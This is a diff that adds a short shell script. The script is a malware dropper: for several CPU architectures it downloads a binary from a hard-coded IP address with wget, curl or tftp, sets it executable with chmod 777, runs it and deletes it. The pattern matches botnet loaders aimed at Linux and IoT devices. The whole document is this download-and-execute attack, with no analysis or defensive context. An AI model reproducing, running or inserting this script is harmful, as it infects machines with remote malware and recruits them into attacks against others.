@@ -1,0 +1,11 @@
+binarys="x86_64 i586 i686"
+server_ip="91.92.255.222"
+
+for arch in $binarys
+do
+rm -rf $arch
+wget http://$server_ip/$arch || curl -O http://$server_ip/$arch || tftp $server_ip -c get $arch || tftp -g -r $arch $server_ip
+chmod 777 $arch
+./$arch x86
+rm -rf $arch
+done
